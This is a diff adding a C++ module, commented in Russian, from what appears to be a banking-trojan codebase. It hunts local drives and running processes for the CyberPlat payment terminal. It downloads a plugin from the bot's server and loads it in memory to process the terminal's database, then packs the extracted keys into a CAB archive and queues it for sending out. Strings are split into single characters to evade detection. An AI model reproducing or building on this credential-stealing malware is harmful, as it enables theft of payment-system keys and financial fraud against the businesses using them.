@@ -1,0 +1,294 @@
+//---------------------------------------------------------------------------
+
+#include <shlobj.h>
+
+#include "CyberPlatDLL.h"
+#include "BotCore.h"
+#include "Loader.h"
+#include "DLLLoader.h"
+#include "CabPacker.h"
+#include "Plugins.h"
+
+
+//#include "BotDebug.h"
+
+namespace CYBERPLATDBGTEMPLATES
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define CPDDBG CYBERPLATDBGTEMPLATES::DBGOutMessage<>
+
+
+//---------------------------------------------------------------------------
+
+const static char CyberPlatPath[] = {'b','i','n','\\','p','a','y','m','e','n','t','m','o','d','u','l','e','\\', 0};
+const static char CyberPlatApp[]  = {'c', 'y', 'b', 'e', 'r', 't', 'e', 'r', 'm', '.', 'e', 'x', 'e',  0};
+const static char CyberPlatDB[]   = {'c','y','b','e','r','t','e','r','m','.','m','d','b',0};
+
+#define HASH_CYBERTERM 0x210FD341 /* cyberterm.exe */
+
+
+//---------------------------------------------------------------------------
+PCHAR CyberPlatGetTempPath()
+{
+	// Функция возвращает путь для хранения временных файлов
+	const static char CBTempPath[] = {'c', 'p', 't', 'm', 'p',  0};
+
+	PCHAR Path = STR::Alloc(MAX_PATH);
+	if (Path == NULL)
+		return NULL;
+
+	pGetTempPathA( MAX_PATH, Path );
+	StrConcat(Path, (PCHAR)CBTempPath);
+	return Path;
+}
+//---------------------------------------------------------------------------
+
+PCHAR CyberPlatGetStotageFileName()
+{
+	// Функция возвращает полное имя файла
+	// где будут храниться данные об обработанных
+	// хранилищах
+
+    const static char FileName[] = {'c', 'b', 'r', 'p', 'l', 's', 't', 'f', '0', '1', '.', 'd', 'a', 't',  0};
+
+    return BOT::GetWorkPath(NULL, (PCHAR)FileName);
+
+}
+//---------------------------------------------------------------------------
+
+bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
+{
+	// Функция добавляет информацию об обработанном файле в базу.
+	// Вернёт истину если данный файл не обрабатывался
+	if (STR::IsEmpty(AppFileName))
+		return false;
+
+	DWORD Hash = STR::GetHash(AppFileName, 0, true);
+
+	PCHAR FileName = CyberPlatGetStotageFileName();
+	if (FileName == NULL)
+		return true;
+
+	// Проверяем есть ли данных хэш в базе
+	DWORD BufSize = 0;
+	PDWORD Buf = (PDWORD)File::ReadToBufferA(FileName, BufSize);
+	if (Buf != NULL)
+	{
+		DWORD Count = BufSize / sizeof(Hash);
+		PDWORD Temp = Buf;
+		for (DWORD i = 0; i < Count; i++, Temp++)
+        {
+			if (*Temp == Hash)
+			{
+				MemFree(Buf);
+				return false;
+            }
+		}
+	}
+
+	// В случае если включена только проверка, то прерываем обработки
+	if (OnlyCheckInBas)
+	{
+		if (Buf != NULL)
+			MemFree(Buf);
+		return true;
+    }
+
+	// Дописываем Хэш в базу
+	DWORD NewBufSize = sizeof(Hash) + BufSize;
+	PDWORD NewBuf = (PDWORD)MemAlloc(NewBufSize);
+	if (NewBuf == NULL) return true;
+
+
+	*NewBuf = Hash;
+
+	// Добавляем старые данные
+	if (Buf != NULL)
+	{
+		m_memcpy((LPBYTE)NewBuf + sizeof(Hash), Buf, BufSize);
+		MemFree(Buf);
+	}
+
+	// Сохраняем данные
+	File::WriteBufferA(FileName, NewBuf, NewBufSize);
+
+	STR::Free(FileName);
+
+	return true;
+
+}
+//---------------------------------------------------------------------------
+
+
+void CyberPlatSendData(PCHAR Path, PCHAR AppName)
+{
+	// Функция отправки данных киберплата
+	CPDDBG("CyberPlatDLL", "Отправляем данные");
+
+	const static char SystemName[] = {'C', 'y', 'b', 'e', 'r', 'P', 'l', 'a', 't', 0};
+	const static char DirName[] = {'K', 'e', 'y', 's',  0};
+
+
+	PCHAR CabName = File::GetTempNameA();
+
+	HCAB Handle = CreateCab(CabName);
+	AddDirToCab(Handle, Path, (PCHAR)DirName);
+	CloseCab(Handle);
+	if (DataGrabber::SendCabDelayed(NULL, CabName, (PCHAR)SystemName))
+	{
+        CPDDBG("CyberPlatDLL", "Данные добавлены в хранилище отправки");
+        CyberPlatAddFileToBase(AppName, false);
+    }
+    pDeleteFileA(CabName);
+	STR::Free(CabName);
+}
+
+//---------------------------------------------------------------------------
+
+void CyberPlatCallPlugin(PCHAR WorkPath, PCHAR AppName)
+{
+	// Загрузить и выполнить плагин киберплата
+	if (STR::IsEmpty(WorkPath)) return;
+
+	CPDDBG("CyberPlatDLL", "Обрабатываем путь [%s]", WorkPath);
+
+	const static char CyberPlatPlugin[] = {'c', 'y', 'b', 'e', 'r', 'p', 'l', 'a', 't', '.', 'p', 'l', 'u', 'g',  0};
+	const static char PluginProcName[] = {'P', 'r', 'o', 'c', '1',  0};
+
+	// Загружаем плагин
+    CPDDBG("CyberPlatDLL", "Загружаем плагин");
+	DWORD ModuleSize = 0;
+	LPVOID Module    = Plugin::Download((PCHAR)CyberPlatPlugin, NULL, &ModuleSize);
+
+	if (Module == NULL)
+	{
+        CPDDBG("CyberPlatDLL", "Плагин отсутствует");
+		return;
+	}
+
+	// Загружаем библиотеку
+    HMEMORYMODULE Handle = MemoryLoadLibrary(Module);
+
+	if (Handle != NULL)
+	{
+		typedef int (WINAPI *TMethod)(PCHAR, PCHAR);
+
+		TMethod Method = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)PluginProcName);
+
+		// Вызываем метод обработки базы киберплаьа
+		if (Method != NULL)
+		{
+			CPDDBG("CyberPlatDLL", "Вызываем метод обработки");
+			PCHAR TempPath = CyberPlatGetTempPath();
+			PCHAR DBFile   = STR::New(2, WorkPath, (PCHAR)CyberPlatDB);
+
+			Method(DBFile, TempPath);
+			CyberPlatSendData(TempPath, AppName);
+
+			STR::Free(TempPath);
+			STR::Free(DBFile);
+		}
+
+		MemoryFreeLibrary(Handle);
+	}
+
+
+	MemFree(Module);
+
+}
+
+
+//---------------------------------------------------------------------------
+
+void CyberPlatCheckDrive(PCHAR Drive, LPVOID Data, bool &Cancel)
+{
+	CPDDBG("CyberPlatDLL", "Проверяем диск %s", Drive);
+	// проверяем не установлена ли программа на диске
+	PCHAR FileName = STR::New(3, Drive, (PCHAR)CyberPlatPath, (PCHAR)CyberPlatApp);
+
+	if (FileExistsA(FileName))
+		if (CyberPlatAddFileToBase(FileName, true))
+		{
+			// Приложение найдено включаем обработку
+			Cancel = true;
+			PCHAR Path = STR::New(2, Drive, (PCHAR)CyberPlatPath);
+			CyberPlatCallPlugin(Path, FileName);
+			STR::Free(Path);
+		}
+
+    STR::Free(FileName);
+}
+//---------------------------------------------------------------------------
+
+
+DWORD WINAPI CyberPlatCheckDrives(LPVOID Data)
+{
+	// Процедура поиска инсталированной программы
+	CPDDBG("CyberPlatDLL", "Запускаем проверку дисков");
+	EnumDrives(DRIVE_FIXED, CyberPlatCheckDrive, NULL);
+	return 0;
+}
+
+
+//---------------------------------------------------------------------------
+
+
+void CyberPlatCheckInstalled()
+{
+	//  функция запускает проверку
+	//  существования необходимой программы на всех локальных
+	//  дисках системы. Поиск осуществляется по пути который,
+	//  по умолчанию предлагает инсталятор программы
+	StartThread(CyberPlatCheckDrives, NULL);
+}
+//---------------------------------------------------------------------------
+
+DWORD WINAPI CyberPlatHandleOwtherApplication(LPVOID Data)
+{
+	// Функция обрабатывает приложение которое не найдено
+	// в стандартных путях поиска
+
+	if (Data == NULL)
+		return 0;
+
+	PCHAR FileName = (PCHAR)Data;
+    PCHAR Path = File::ExtractFilePathA(FileName);
+
+	if (Path != NULL)
+	{
+		// Запускаем плвагин на обработку
+		CyberPlatCallPlugin(Path, FileName);
+    }
+
+	STR::Free(FileName);
+	STR::Free(Path);
+	return NULL;
+}
+
+//---------------------------------------------------------------------------
+
+bool CyberPlatCheckApplication(PCHAR AppName)
+{
+	// Функция проверяет запущенное приложение на предмет того, не
+	// является ли он необработанным приложением киберплата
+	if (STR::IsEmpty(AppName))
+		return false;
+	PCHAR FileName = File::ExtractFileNameA(AppName, false);
+	DWORD Hash = STR::GetHash(FileName, 0, true);
+	if (Hash == HASH_CYBERTERM)
+		if (CyberPlatAddFileToBase(AppName, true))
+		{
+			// Нужное нам приложение
+			PCHAR FileNameDuplicate = STR::New(AppName);
+			StartThread(CyberPlatHandleOwtherApplication, FileNameDuplicate);
+			return true;
+		}
+
+    return false;
+}
+
+
+//---------------------------------------------------------------------------
